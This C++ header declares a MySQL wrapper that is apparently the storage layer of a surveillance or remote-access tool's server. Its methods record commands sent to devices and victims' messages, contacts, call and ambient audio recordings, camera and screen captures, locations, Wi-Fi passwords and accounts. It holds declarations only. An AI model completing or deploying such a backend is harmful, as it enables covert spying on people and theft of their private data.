#pragma once

#include <vector>
#include <iostream>
#include "include/mysql.h"



using namespace std;

class MySql {
public:

	MySql();
	~MySql();

	void closeMySQL();
	bool connectMySQL(char* server, char* username, char* password, char* database, int port);
	bool createDatabase(std::string dbname);
	bool createdbTable(const std::string& query);
	void errorIntoMySQL();
	bool MySql::useDatabase(std::string dbname);
	bool getDatafromDB(string queryStr, std::vector<std::vector<std::string> >& data);

	//bool MySql::init();

	bool setting();

	static void MySql::initLock();
	static void enterLock();
	static void leaveLock();
	
	string MySql::getIDFromClient(string mac);
	string MySql::getIdFromUser(string username);

	int MySql::insertCmd(string username, string mac, string commandline);

	string MySql::checkSingleID(string key, string value, string table);

	int MySql::insertClient(string username, string mac, string info,string model);
	int MySql::insertClientFromCmd(string username, string mac,int onlinetype);

	string MySql::getLocID(string clientid, int utc);
	int MySql::insertLocation(string username, string mac, string lat, string lon,string timenow,string addr);

	string MySql::getMsgID(string clientid, string ts);
	int MySql::insertMsg(string mac, string name, string number, string type, string msgtime, string data,string id);

	string MySql::getContactID(string clientid,string number, string name);
	int MySql::insertContact(string username,string mac, string name, string number);

	string MySql::getBookmarkID(string clientid, string url);
	int MySql::insertBookMark(string username, string mac, string url, string title, string count, string ctime, string ts);

	int MySql::insertScreenCap(string username, string mac, string path, string timenow);

	string MySql::getIdFromWifi(string clientid, string list);
	int MySql::insertWifi(string username, string mac, string list, string password);

	string MySql::getIdFromWifi2(string clientid, string list);
	int MySql::insertWifi2(string username, string mac, string list, string password);

	int MySql::insertCamera(string mac, string type,string timenow, string filepath);

	int insertEnviromentAudio(string username, string mac, string timenow, string filepath, int filesize,int duration);

	string MySql::getCalllogIDFromNumber(string clientid, string number);
	int insertCallAudio(string username, string imei, string number, string timenow, string type, string filepath, int filesize, int duration);
	string MySql::getCalllogID(string clientid, int ts);
	int MySql::insertCallLog(string username, string mac, string number, string type, string ts, string duration);

	string MySql::getInstallAppsID(string clientid, string softname);
	int MySql::insertInstallApps(string mac, string name, string package, string ver, string ctime, string utime,string type);

	string MySql::getProcessID(string clientid, string processes);
	int MySql::insertProcesses(string username,string mac, string pname, string pid,string uid);

	string MySql::getAllFilesID(string clientid, string filename);
	int MySql::insertAllFiles(string username, string mac, string fn,string filepath, int filesize, int type);

	string MySql::getIdFromFiles(string clientid, string fullname);
	bool MySql::insertFiles(string mac, string name, string path, int type, int size);

	string MySql::getIdFromAccount(string clientid);
	int MySql::insertAccount(string username, string mac, string infos, string type);
	int MySql::insertFilesOper(string mac, string fullname);

	int MySql::insertDownloadFile(string mac, string data);
	int MySql::insertUploadFile(string mac, string data);

	string MySql::getInfosFromClient(string no);
	int MySql::modifyInfo();
	string MySql::getIDFromClient(int no);

	int MySql::insertOnline(string userid, string clientid);

	string MySql::getListFromWifi(string no);

	vector<vector<string>> MySql::getAllImeiFromUser(string username);

	int removedata(string imei);

	int MySql::deleteUser(string username);
public:
	int errorNum;                    //错误代号
	char* errorInfo;             //错误提示

	MYSQL mysqlInstance;                      //MySQL对象，必备的一个数据结构
	                 //用于存放结果 建议用char* 数组将此结果转存
};